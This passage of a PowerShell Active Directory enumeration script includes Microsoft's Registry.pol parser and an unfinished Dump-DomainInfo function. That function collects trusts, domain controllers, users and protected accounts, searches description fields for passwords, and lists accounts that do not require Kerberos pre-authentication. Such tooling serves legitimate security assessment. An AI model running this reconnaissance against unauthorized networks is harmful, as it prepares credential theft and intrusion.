        if($DriveCheck) {
            #Write-Verbose "$Drivename created."
        }else{
            Write-Verbose "Failed to mount $DriveName to $DrivePath."
            return
        }

        # Domain Name
        if(-not $Domain){
            $Domain = Get-ChildItem $DrivePath | Select-Object name -First 1 -ExpandProperty name
        }
        $GpoPoliciesPath = "$DrivePath\$Domain\Policies"

        # Check number of policies
        $Policies = Get-ChildItem $GpoPoliciesPath |  select fullname
        $PolCount = $Policies.Count
        Write-Verbose "$PolCount policy folders found"

        # Find registry.pol files
        $RegistryPolFiles = New-Object System.Collections.ArrayList
        $Policies | 
        Foreach {
    
            # Get machine file
            $PolicyPath = $_.fullname
            $RegpolPath = "$PolicyPath\Machine\Registry.pol"   
            $RegistryPolFiles += $RegpolPath

            # Get user file
            $PolicyPath = $_.fullname
            $RegpolPath = "$PolicyPath\User\Registry.pol" 
            $RegistryPolFiles += $RegpolPath 

        }

        # Iterate through discovered files
        $FileCount = $RegistryPolFiles.Count
        Write-Verbose "$FileCount Registry.pol files are being parsed..."
        $Results = $RegistryPolFiles | 
        Foreach {

            # Parse discovered file    
            $FullPath = $_
            $RegistrySettings = Parse-PolFile -Path "$FullPath" -ErrorAction SilentlyContinue

            $RegistrySettings |
            foreach{

                # Build custom output object that includes the file path and the domain
                $object = New-Object psobject
                $object | add-member noteproperty Domain $Domain
                $object | add-member noteproperty FilePath $FullPath
                $object | add-member noteproperty KeyName $_.KeyName
                $object | add-member noteproperty ValueType $_.ValueType
                $object | add-member noteproperty ValueLength $_.ValueLength
                $object | add-member noteproperty ValueData $_.ValueData

                # Display entry
                $object 
            } 

        }

        # Status
        $EntryCount = $Results.Count
        Write-Verbose "$EntryCount registry entries parsed"

        # Return all registry entries
        $Results
    }
}

###########################################################
#
#  Group Policy - Registry Policy parser module
#
#  Copyright (c) Microsoft Corporation, 2016
#
###########################################################
# Source: https://github.com/PowerShell/GPRegistryPolicyParser
<#
------------------------------------------ START OF LICENSE -----------------------------------------

PowerShell-GPRegistryPolicy-Cmdlets v.0.1

Copyright (c) Microsoft Corporation

All rights reserved. 

MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

----------------------------------------------- END OF LICENSE ------------------------------------------
#>

data LocalizedData
{
    # culture="en-US"
    ConvertFrom-StringData @'
    InvalidHeader = File '{0}' has an invalid header.
    InvalidVersion = File '{0}' has an invalid version. It should be 1.
    InvalidFormatBracket = File '{0}' has an invalid format. A [ or ] was expected at location {1}.
    InvalidFormatSemicolon = File '{0}' has an invalid format. A ; was expected at location {1}.
    OnlyCreatingKey = Some values are null. Only the registry key is created.
    InvalidPath = Path {0} doesn't point to an existing registry key/property.
    InternalError = Internal error while creating a registry entry for {0}
    InvalidIntegerSize = Invalid size for an integer. Must be less than or equal to 8.
'@
}

# Import-LocalizedData  LocalizedData #-filename GPRegistryPolicyParser.Strings.psd1

$script:REGFILE_SIGNATURE = 0x67655250 # PRef
$script:REGISTRY_FILE_VERSION = 0x00000001 #Initially defined as 1, then incremented each time the file format is changed.

$script:DefaultEntries = @(
    "Software\Policies"
)

Enum RegType {
    REG_NONE                       = 0	# No value type
    REG_SZ                         = 1	# Unicode null terminated string
    REG_EXPAND_SZ                  = 2	# Unicode null terminated string (with environmental variable references)
    REG_BINARY                     = 3	# Free form binary
    REG_DWORD                      = 4	# 32-bit number
    REG_DWORD_LITTLE_ENDIAN        = 4	# 32-bit number (same as REG_DWORD)
    REG_DWORD_BIG_ENDIAN           = 5	# 32-bit number
    REG_LINK                       = 6	# Symbolic link (Unicode)
    REG_MULTI_SZ                   = 7	# Multiple Unicode strings, delimited by \0, terminated by \0\0
    REG_RESOURCE_LIST              = 8  # Resource list in resource map
    REG_FULL_RESOURCE_DESCRIPTOR   = 9  # Resource list in hardware description
    REG_RESOURCE_REQUIREMENTS_LIST = 10
    REG_QWORD                      = 11 # 64-bit number
    REG_QWORD_LITTLE_ENDIAN        = 11 # 64-bit number (same as REG_QWORD)
}

Class GPRegistryPolicy
{
    [string]  $KeyName
    [string]  $ValueName
    [RegType] $ValueType
    [string]  $ValueLength
    [object]  $ValueData

    GPRegistryPolicy()
    {
        $this.KeyName     = $Null
        $this.ValueName   = $Null
        $this.ValueType   = [RegType]::REG_NONE
        $this.ValueLength = 0
        $this.ValueData   = $Null
    }

    GPRegistryPolicy(
            [string]  $KeyName,
            [string]  $ValueName,
            [RegType] $ValueType,
            [string]  $ValueLength,
            [object]  $ValueData
        )
    {
        $this.KeyName     = $KeyName
        $this.ValueName   = $ValueName
        $this.ValueType   = $ValueType
        $this.ValueLength = $ValueLength
        $this.ValueData   = $ValueData
    }

    [string] GetRegTypeString()
    {
        [string] $Result = ""

        switch ($this.ValueType)
        {
            ([RegType]::REG_SZ)        { $Result = "String" }
            ([RegType]::REG_EXPAND_SZ) { $Result = "ExpandString" }
            ([RegType]::REG_BINARY)    { $Result = "Binary" }
            ([RegType]::REG_DWORD)     { $Result = "DWord" }
            ([RegType]::REG_MULTI_SZ)  { $Result = "MultiString" }
            ([RegType]::REG_QWORD)     { $Result = "QWord" }
            default                    { $Result = "" }
        }

        return $Result
    }

    static [RegType] GetRegTypeFromString( [string] $Type )
    {
        $Result = [RegType]::REG_NONE

        switch ($Type)
        {
            "String"       { $Result = [RegType]::REG_SZ }
            "ExpandString" { $Result = [RegType]::REG_EXPAND_SZ }
            "Binary"       { $Result = [RegType]::REG_BINARY }
            "DWord"        { $Result = [RegType]::REG_DWORD }
            "MultiString"  { $Result = [RegType]::REG_MULTI_SZ }
            "QWord"        { $Result = [RegType]::REG_QWORD }
            default        { $Result = [RegType]::REG_NONE }
        }

        return $Result
    }
}

Function New-GPRegistryPolicy
{
    param (
        [Parameter(Mandatory=$true,Position=0)]
        [ValidateNotNullOrEmpty()]
        [string]
        $keyName,
        
        [Parameter(Position=1)]
        [string]
        $valueName = $null,
        
        [Parameter(Position=2)]
        [RegType]
        $valueType = [RegType]::REG_NONE,
        
        [Parameter(Position=3)]
        [string]
        $valueLength = $null,
        
        [Parameter(Position=4)]
        [object]
        $valueData = $null
        )

    $Policy = [GPRegistryPolicy]::new($keyName, $valueName, $valueType, $valueLength, $valueData)

    return $Policy;
}

Function Get-RegType
{
    param (
		[Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Type
    )

    return [GPRegistryPolicy]::GetRegTypeFromString($Type)
}

<# 
.SYNOPSIS
Reads and parses a .pol file.

.DESCRIPTION
Reads a .pol file, parses it and returns an array of Group Policy registry settings.

.PARAMETER Path
Specifies the path to the .pol file.

.EXAMPLE
C:\PS> Parse-PolFile -Path "C:\Registry.pol"
#>
Function Parse-PolFile
{
    [OutputType([Array])]
    param (
        [Parameter(Mandatory=$true,Position=0)]
        [string]
        $Path
    )

    [Array] $RegistryPolicies = @()
    $index = 0

    [string] $policyContents = Get-Content $Path -Raw
    [byte[]] $policyContentInBytes = Get-Content $Path -Raw -Encoding Byte

    # 4 bytes are the signature PReg
    $signature = [System.Text.Encoding]::ASCII.GetString($policyContents[0..3])
    $index += 4
    Assert ($signature -eq 'PReg') ($LocalizedData.InvalidHeader -f $Path)

    # 4 bytes are the version
    $version = [System.BitConverter]::ToInt32($policyContentInBytes, 4)
    $index += 4
    Assert ($version -eq 1) ($LocalizedData.InvalidVersion -f $Path)

    # Start processing at byte 8
    while($index -lt $policyContents.Length - 2)
    {
        [string]$keyName = $null
        [string]$valueName = $null
        [int]$valueType = $null
        [int]$valueLength = $null

        [object]$value = $null

        # Next UNICODE character should be a [
        $leftbracket = [System.BitConverter]::ToChar($policyContentInBytes, $index)
        Assert ($leftbracket -eq '[') "Missing the openning bracket"
        $index+=2

        # Next UNICODE string will continue until the ; less the null terminator
        $semicolon = $policyContents.IndexOf(";", $index)
        Assert ($semicolon -ge 0) "Failed to locate the semicolon after key name."
        $keyName = [System.Text.Encoding]::UNICODE.GetString($policyContents[($index)..($semicolon-3)]) # -3 to exclude the null termination and ';' characters
        $index = $semicolon + 2

        # Next UNICODE string will continue until the ; less the null terminator
        $semicolon = $policyContents.IndexOf(";", $index)
        Assert ($semicolon -ge 0) "Failed to locate the semicolon after value name."
        $valueName = [System.Text.Encoding]::UNICODE.GetString($policyContents[($index)..($semicolon-3)]) # -3 to exclude the null termination and ';' characters
        $index = $semicolon + 2

        # Next DWORD will continue until the ;
        $semicolon = $index + 4 # DWORD Size
        Assert ([System.BitConverter]::ToChar($policyContentInBytes, $semicolon) -eq ';') "Failed to locate the semicolon after value type."
        $valueType = [System.BitConverter]::ToInt32($policyContentInBytes, $index)
        $index=$semicolon + 2 # Skip ';'

        # Next DWORD will continue until the ;
        $semicolon = $index + 4 # DWORD Size
        Assert ([System.BitConverter]::ToChar($policyContentInBytes, $semicolon) -eq ';') "Failed to locate the semicolon after value length."
        $valueLength = Convert-StringToInt -ValueString $policyContentInBytes[$index..($index+3)]
        $index=$semicolon + 2 # Skip ';'

        if ($valueLength -gt 0)
        {
            # String types less the null terminator for REG_SZ and REG_EXPAND_SZ
            # REG_SZ: string type (ASCII)
            if($valueType -eq [RegType]::REG_SZ)
            {
                [string] $value = [System.Text.Encoding]::UNICODE.GetString($policyContents[($index)..($index+$valueLength-3)]) # -3 to exclude the null termination and ']' characters
                $index += $valueLength
            }

            # REG_EXPAND_SZ: string, includes %ENVVAR% (expanded by caller) (ASCII)
            if($valueType -eq [RegType]::REG_EXPAND_SZ)
            {
                [string] $value = [System.Text.Encoding]::UNICODE.GetString($policyContents[($index)..($index+$valueLength-3)]) # -3 to exclude the null termination and ']' characters
                $index += $valueLength
            }

            # For REG_MULTI_SZ leave the last null terminator
            # REG_MULTI_SZ: multiple strings, delimited by \0, terminated by \0\0 (ASCII)
            if($valueType -eq [RegType]::REG_MULTI_SZ)
            {
                [string] $value = [System.Text.Encoding]::UNICODE.GetString($policyContents[($index)..($index+$valueLength-3)])
                $index += $valueLength
            }

            # REG_BINARY: binary values
            if($valueType -eq [RegType]::REG_BINARY)
            {
                [byte[]] $value = $policyContentInBytes[($index)..($index+$valueLength-1)]
                $index += $valueLength
            }
        }

        # DWORD: (4 bytes) in little endian format
        if($valueType -eq [RegType]::REG_DWORD)
        {
            $value = Convert-StringToInt -ValueString $policyContentInBytes[$index..($index+3)]
            $index += 4
        }

        # QWORD: (8 bytes) in little endian format
        if($valueType -eq [RegType]::REG_QWORD)
        {
            $value = Convert-StringToInt -ValueString $policyContentInBytes[$index..($index+7)]
            $index += 8
        }

        # Next UNICODE character should be a ]
        $rightbracket = $policyContents.IndexOf("]", $index) # Skip over null data value if one exists
        Assert ($rightbracket -ge 0) "Missing the closing bracket."
        $index = $rightbracket + 2

        $entry = New-GPRegistryPolicy $keyName $valueName $valueType $valueLength $value

        $RegistryPolicies += $entry
    }

    return $RegistryPolicies
}

<# 
.SYNOPSIS
Reads registry policies from a list of entries.

.DESCRIPTION
Reads registry policies from a list of entries and returns an array of GPRegistryPolicies.

.PARAMETER Division
Specifies the division from which the registry entries will be read.

.EXAMPLE
C:\PS> Read-RegistryPolicies -Division "LocalMachine"

.EXAMPLE
C:\PS> Read-RegistryPolicies -Division "LocalMachine" -Entries @('Software\Policies\Microsoft\Windows', 'Software\Policies\Microsoft\WindowsFirewall')
#>
Function Read-RegistryPolicies
{
    [OutputType([Array])]
    param (

        [ValidateSet("LocalMachine", "CurrentUser", "Users")]
        [string]
        $Division = "LocalMachine",
		
        [string[]]
        $Entries = $script:DefaultEntries
    )

    [Array] $RegistryPolicies = @()

    switch ($Division) 
    { 
        'LocalMachine' { $Hive = [Microsoft.Win32.Registry]::LocalMachine } 
        'CurrentUser'  { $Hive = [Microsoft.Win32.Registry]::CurrentUser } 
        'Users'        { $Hive = [Microsoft.Win32.Registry]::Users } 
    }

    foreach ($entry in $Entries)
    {
        #if (Test-Path -Path $entry)
        if (IsRegistryKey -Path $entry -Hive $Hive)
        {
            # $entry is a key.
            $Key = $Hive.OpenSubKey($entry)

            # Add the key itself
            $rp = New-GPRegistryPolicy -keyName $entry
            $RegistryPolicies += $rp

            # Check default value
            if ($Key.GetValue(''))
            {
                $info = Get-RegKeyInfo -RegKey $Key -ValueName ''
                $rp = New-GPRegistryPolicy -keyName $entry -valueName '' -valueType $info.Type -valueLength $info.Size -valueData $info.Data
                $RegistryPolicies += $rp
            }
            
            if ($Key.ValueCount -gt 0)
            {
                # Copy values under the key
                $ValueNames = $Key.GetValueNames()
                foreach($value in $ValueNames)
                {
                    if ([System.String]::IsNullOrEmpty($value))
                    {
                        $rp = New-GPRegistryPolicy -keyName $entry
                    }
                    else
                    {
                        $info = Get-RegKeyInfo -RegKey $Key -ValueName $value
                        $rp = New-GPRegistryPolicy -keyName $entry -valueName $value -valueType $info.Type -valueLength $info.Size -valueData $info.Data
                    }
                    $RegistryPolicies += $rp
                }
            }

            if ($Key.SubKeyCount -gt 0)
            {
                # Copy subkeys recursively
                $SubKeyNames = $Key.GetSubKeyNames()
                $newEntries = @()

                foreach($subkey in $SubKeyNames)
                {
                    $newEntry = Join-Path -Path $entry -ChildPath $subkey
                    $newEntries += ,$newEntry
                }

                $RegistryPolicies += Read-RegistryPolicies -Entries $newEntries -Division $Division
            }
        }
        else
        {
            $Tokens = $entry.Split('\')
            $Property = $Tokens[-1]
            $ParentKey = $Tokens[0..($Tokens.Count-2)] -join '\'
            $NoSuchKeyOrProperty = $false
        
            if (IsRegistryKey -Path $ParentKey -Hive $Hive)
            {
                # $entry is a property.
                # [key;value;type;size;data]
        
                $Key = $Hive.OpenSubKey($ParentKey)

                if ($Key.GetValueNames() -icontains $Property)
                {
                    $info = Get-RegKeyInfo -RegKey $Key -ValueName $Property
                    $rp = [GPRegistryPolicy]::new($ParentKey, $Property, $info.Type, $info.Size, $info.Data)
                    $RegistryPolicies += $rp
                }
                else
                {
                    $NoSuchKeyOrProperty = $true
                }
            }
            else
            {
                $NoSuchKeyOrProperty = $true
            }

            if ( $NoSuchKeyOrProperty -and @('Continue', 'SilentlyContinue', 'Ignore' ) -inotcontains $ErrorActionPreference)
            {
                # $entry points to a key/property that doesn't exist.
                $NoSuchKeyOrProperty = $true
                Fail -ErrorMessage ($LocalizedData.InvalidPath -f $entry)
            }
        }
    }

    return $RegistryPolicies
}

<# 
.SYNOPSIS
Creates a .pol file entry byte array from a GPRegistryPolicy instance.

.DESCRIPTION
Creates a .pol file entry byte array from a GPRegistryPolicy instance. This entry can be written
in a .pol file later.

.PARAMETER RegistryPolicy
Specifies the registry policy entry.
#>
Function Create-RegistrySettingsEntry
{
    [OutputType([Array])]
    param (
		[Parameter(Mandatory = $true)]
        [alias("RP")]
        [GPRegistryPolicy]
        $RegistryPolicy
    )
        
    # Entry format: [key;value;type;size;data]
    [Byte[]] $Entry = @()
        
    $Entry += [System.Text.Encoding]::Unicode.GetBytes('[') # Openning bracket
        
    $Entry += [System.Text.Encoding]::Unicode.GetBytes($RP.KeyName + "`0")

    $Entry += [System.Text.Encoding]::Unicode.GetBytes(';') # semicolon as delimiter

    $Entry += [System.Text.Encoding]::Unicode.GetBytes($RP.ValueName + "`0")

    $Entry += [System.Text.Encoding]::Unicode.GetBytes(';') # semicolon as delimiter

    $Entry += [System.BitConverter]::GetBytes([Int32]$RP.ValueType)

    $Entry += [System.Text.Encoding]::Unicode.GetBytes(';') # semicolon as delimiter

    #Assert $type ($LocalizedData.InternalError -f $key)
    # Get data bytes then compute byte size based on data and type
    switch ($RP.ValueType)
    {
        { @([RegType]::REG_SZ, [RegType]::REG_EXPAND_SZ, [RegType]::REG_MULTI_SZ) -contains $_ }
            {
                $dataBytes = [System.Text.Encoding]::Unicode.GetBytes($RP.ValueData + "`0")
                $dataSize = $dataBytes.Count
            }

        ([RegType]::REG_BINARY)
            {
                $dataBytes = [System.Text.Encoding]::Unicode.GetBytes($RP.ValueData)
                $dataSize = $dataBytes.Count
            }

        ([RegType]::REG_DWORD)
            {
                $dataBytes = [System.BitConverter]::GetBytes([Int32]$RP.ValueData)
                $dataSize = 4
            }

        ([RegType]::REG_QWORD)
            {
                $dataBytes = [System.BitConverter]::GetBytes([Int64]$RP.ValueData)
                $dataSize = 8
            }

        default
            {
                $dataBytes = [System.Text.Encoding]::Unicode.GetBytes("")
                $dataSize = 0
            }
    }

    #Assert $type ($LocalizedData.InternalError -f $key)
    $Entry += [System.BitConverter]::GetBytes($dataSize)

    $Entry += [System.Text.Encoding]::Unicode.GetBytes(';') # semicolon as delimiter

    #Assert $type ($LocalizedData.InternalError -f $key)
    $Entry += $dataBytes

    $Entry += [System.Text.Encoding]::Unicode.GetBytes(']') # Closing bracket

    return $Entry
}

<# 
.SYNOPSIS
Appends an array of registry policy entries to a file.

.DESCRIPTION
Appends an array of registry policy entries to a file.

.PARAMETER RegistryPolicies
An array of registry policy entries.

.PARAMETER Path
Path to a file (.pol extension)
#>
Function Append-RegistryPolicies
{
    param (
		[Parameter(Mandatory = $true)]
        [GPRegistryPolicy[]]
        $RegistryPolicies,

		[Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path
    )
        
    foreach ($rp in $RegistryPolicies)
    {
        [Byte[]] $Entry = Create-RegistrySettingsEntry -RegistryPolicy $rp
        $Entry | Add-Content -Path $Path -Encoding Byte
    }
}

Function Assert
{
    param (
        [Parameter(Mandatory)]
        $Condition,

        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ErrorMessage
    )

    if (!$Condition) 
    {
        Fail -ErrorMessage $ErrorMessage;
    }
}

Function Fail
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ErrorMessage
    )
  
    throw $ErrorMessage
}

<# 
.SYNOPSIS
Creates a file and initializes it with Group Policy Registry file format signature.

.DESCRIPTION
Creates a file and initializes it with Group Policy Registry file format signature.

.PARAMETER Path
Path to a file (.pol extension)
#>
Function Create-GPRegistryPolicyFile
{
    param (
        [Parameter(Mandatory)]
        $Path
    )

    $null = Remove-Item -Path $Path -Force -Verbose -ErrorAction SilentlyContinue

    New-Item -Path $Path -Force -Verbose -ErrorAction Stop | Out-Null

    [System.BitConverter]::GetBytes($script:REGFILE_SIGNATURE) | Add-Content -Path $Path -Encoding Byte
    [System.BitConverter]::GetBytes($script:REGISTRY_FILE_VERSION) | Add-Content -Path $Path -Encoding Byte
}

<# 
.SYNOPSIS
Returns the type, size and data values of a given registry key.

.DESCRIPTION
Returns the type, size and data values of a given registry key.

.PARAMETER RegKey
Registry Key

.PARAMETER ValueName
The name of the Value under the given registry key
#>
Function Get-RegKeyInfo
{
    param (
		[Parameter(Mandatory = $true)]
        [Microsoft.Win32.RegistryKey]
        $RegKey,

		[Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]
        $ValueName

    )

    switch ($RegKey.GetValueKind($ValueName))
    {
        "String"       {
            $Type = $RegKey.GetValueKind($ValueName)
            $Data = $RegKey.GetValue($ValueName)
            $Size = $Data.Length
        }

        "ExpandString"       {
            $Type = $RegKey.GetValueKind($ValueName)
            $Data = $RegKey.GetValue($ValueName,$null,[Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
            $Size = $Data.Length
        }

        "Binary"       {
            $Type = $RegKey.GetValueKind($ValueName)
            $value = $RegKey.GetValue($ValueName)
            $Data = [System.Text.Encoding]::Unicode.GetString($value)
            $Size = $Data.Count
        }

        "DWord"        {
            $Type = $RegKey.GetValueKind($ValueName)
            $Data = $RegKey.GetValue($ValueName)
            $Size = 4
        }

        "MultiString"  {
            $Type = $RegKey.GetValueKind($ValueName)
            $Data = ($RegKey.GetValue($ValueName) -join "`0") + "`0"
            $Size = $Data.Length
        }

        "QWord"        {
            $Type = $RegKey.GetValueKind($ValueName)
            $Data = $RegKey.GetValue($ValueName)
            $Size = 8
        }

        default        {
            $Type = $null
            $Data = $null
            $Size = 0
        }
    }

    return @{
        'Type' = $Type;
        'Size' = $Size;
        'Data' = $Data;
    }
}

Function IsRegistryKey
{
    param (
		[Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        [Microsoft.Win32.RegistryKey]
        $Hive = [Microsoft.Win32.Registry]::LocalMachine
    )

    $key = $Hive.OpenSubKey($Path)

    if ($key)
    {
        if ($PSVersionTable.PSEdition -ieq 'Core')
        {
            $key.Flush()
            $key.Dispose()
        }
        else
        {
            $key.Close()
        }
        return $true
    }
    else
    {
        return $false
    }
}

Function Convert-StringToInt
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [System.Object[]]
        $ValueString
    )
  
    if ($ValueString.Length -le 4)
    {
        [int32] $result = 0
    }
    elseif ($ValueString.Length -le 8)
    {
        [int64] $result = 0
    }
    else
    {
        Fail -ErrorMessage $LocalizedData.InvalidIntegerSize
    }

    for ($i = $ValueString.Length - 1 ; $i -ge 0 ; $i -= 1)
    {
        $result = $result -shl 8
        $result = $result + ([int][char]$ValueString[$i])
    }

    return $result
} 


# -------------------------------------------
# Function: Dump-DomainInfo 
# -------------------------------------------
Function Dump-DomainInfo 
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory=$false,
        HelpMessage="Folder to write output to.")]
        [string]$OutFolder,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )
    BEGIN
    {
        # ------------------------------------------------------------
        # Setup Credential Object and LDAP
        # ------------------------------------------------------------

        # Create PS Credential object
        if($Password)
        {
            Write-Verbose "Creating PsCredential object..."
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        } 
                

        # ------------------------------------------------------------
        # Setup Output Directory
        # ------------------------------------------------------------
        if($OutFolder){            
            $OutFolderCmd = "echo test > $OutFolder\test.txt"           
        }else{
            $OutFolder = "."
            $OutFolderCmd = "echo test > $OutFolder\test.txt"             
        }

        # Create output folder
        $CheckAccess = (Invoke-Expression $OutFolderCmd) 2>&1
        if($CheckAccess -like "*denied."){
            Write-Host "Access denied to output directory."
            Break    
        }else{
            Write-Verbose "Verified write access to output directory."
            $RemoveCmd = "del $outfolder\test.txt"
            Invoke-Expression $RemoveCmd
        }  

        # ------------------------------------------------------------
        # Setup Data Tables 
        # ------------------------------------------------------------

        # Domains
        $TableDomains = New-Object System.Data.DataTable         
        $TableDomains.Columns.Add('Domain') | Out-Null

        # Domain Trusts
        $TableDomainTrusts = New-Object System.Data.DataTable         
        $TableDomainTrusts.Columns.Add('Domain') | Out-Null
        $TableDomainTrusts.Columns.Add('TrustedDomain') | Out-Null
        $TableDomainTrusts.Columns.Add('TrustType') | Out-Null

        # Domain Controllers
        $TableDomainControllers = New-Object System.Data.DataTable         
        $TableDomainControllers.Columns.Add('ComputerName') | Out-Null
        $TableDomainControllers.Columns.Add('IpAddress') | Out-Null
        $TableDomainControllers.Columns.Add('Available') | Out-Null 
        $TableDomainControllers.Columns.Add('Domain') | Out-Null
        $TableDomainControllers.Columns.Add('Role') | Out-Null                     
    }

    PROCESS
    {        

        # ------------------------------------------------------------
        # Grab Information from Active Directory
        # ------------------------------------------------------------
        # Need to update to enumerate trusts, domains, and dcs recursively


        # Grab initial domain controller
        if($DomainController){
            $TargetDC = $DomainController
        }else{
            $TargetDC  = $env:LOGONSERVER  -replace '\\',''         
        }


        # Check authentication method
        if ($password)
        {
            Write-Host "Attempting to dump information from $TargetDC as $username..." 
            $Check_User = $username
        }else{
            Write-Host "Attempting to dump information from $TargetDC as $env:USERNAME..."
            $Check_User = $env:USERNAME
        }

	
        # Status the user
        Write-Host "Note: Be patient, in large domains this can take a while." -foreground gray
        Write-Host "Note: Run with -verbose switch to view details in run time." -foreground gray


        # Get domain's distinguishedName 
        Write-Verbose "Getting domain..."
        $SourceDomain = Get-Domain -DomainController $DomainController -username $username -password $password -Credential $Credential | Select-Object SourceDomain -ExpandProperty SourceDomain
        $SourceDomainDn = Get-Domain -DomainController $DomainController -username $username -password $password -Credential $Credential | Select-Object SourceDomainDn -ExpandProperty SourceDomainDn
        Write-Verbose "Domain Name: $SourceDomain"
        Write-Verbose "Distinguished Name: $SourceDomainDn"


        # Get domain trusts
        # Need to a recursion
        $OutputPath_DomainTrusts = "$outfolder\$TargetDC"+"_Domain_Trusts.csv"
        Get-DomainTrust -username $username -password $password -DomainController $DomainController -Credential $Credential| Export-Csv $OutputPath_DomainTrusts -NoTypeInformation


        # Get domain controllers for current domain
        # Need to a recursion
        $OutputPath_Domain_Contollers = "$outfolder\$TargetDC"+"_Domain_Computers_Domain_Controllers.csv"
        Get-DomainComputerDC -username $username -password $password -DomainController $DomainController -Credential $Credential| Export-Csv $OutputPath_Domain_Contollers -NoTypeInformation


        # Get domain users        
        $OutputPath_Domain_Users = "$outfolder\$TargetDC"+"_Domain_Users.csv"
        $TableDomainUsers = Get-DomainUser -username $username -password $password -DomainController $DomainController -Credential $Credential 
        $TableDomainUsers | Export-Csv $OutputPath_Domain_Users -NoTypeInformation


        # Check user descriptions for the work "password", "cred", "pw"   
        Write-Verbose "Searching for the keyword `"password`" in user description field..."
        $OutputPath_Domain_UsersPwInDesc = "$outfolder\$TargetDC"+"_Domain_Users_PwInDescription.csv"
        $UsersPwInDesc = $TableDomainUsers | Where-Object description -like "*pass*"
        $UserPwDescCount = $UsersPwInDesc | measure | select count -ExpandProperty count
        $UsersPwInDesc | Export-Csv $OutputPath_Domain_UsersPwInDesc -NoTypeInformation
        Write-Verbose "$UserPwDescCount domain users found with a potential password in the description field."


        # Get protected users
        # https://technet.microsoft.com/en-us/magazine/2009.09.sdadminholder.aspx
        # http://www.selfadsi.org/extended-ad/ad-permissions-adminsdholder.htm
        # http://windowsitpro.com/active-directory/advanced-active-directory-security
        # Get-ADObject -LDAPFilter "(admincount=1)" -Properties *
        Write-Verbose "Parsing protected users (admincount=1)..."
        $OutputPath_Domain_Users_Protected = "$outfolder\$TargetDC"+"_Domain_Users_Protected.csv"
        $ProtectedUsers = $TableDomainUsers | Where-Object { $_.admincount -eq 1}
        $ProtectedUsersCount = $ProtectedUsers.Rows.Count
        if($ProtectedUsersCount -eq 0)
        {
            Write-Verbose "0 protected users found."
        }else{
            Write-Verbose "$ProtectedUsersCount protected users found."
        }
        $TableDomainUsers | Where-Object { $_.admincount -eq 1} | Export-Csv $OutputPath_Domain_Users_Protected -NoTypeInformation


        # Get disabled domain users
        $OutputPath_DomainUsersDisabled  = "$outfolder\$TargetDC"+"_Domain_Users_Disabled.csv"
        $TableDomainUsersDisabled = Get-DomainUsersDisabled -username $username -password $password -DomainController $DomainController -Credential $Credential 
        $TableDomainUsersDisabled | Export-Csv $OutputPath_DomainUsersDisabled -NoTypeInformation


        # Get locked domain users
        $OutputPath_DomainUsersLocked  = "$outfolder\$TargetDC"+"_Domain_Users_Locked.csv"
        $TableDomainUsersLocked = Get-DomainUsersLocked -username $username -password $password -DomainController $DomainController -Credential $Credential 
        $TableDomainUsersLocked | Export-Csv $OutputPath_DomainUsersLocked -NoTypeInformation


        # Get the users that dont require kerb pre auth
        $OutputPath_Domain_NoPreAuth = "$outfolder\$TargetDC"+"_Domain_Users_NoKerbPreAuthReq.csv"
        $TableDomainNoPreAuth = Get-DomainUserKerbPreAuthNotRequired -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainNoPreAuth | Export-Csv $OutputPath_Domain_NoPreAuth -NoTypeInformation


        # Get the users with password that never expire
        $OutputPath_Domain_NoPwExp = "$outfolder\$TargetDC"+"_Domain_Users_PwDontExpire.csv"
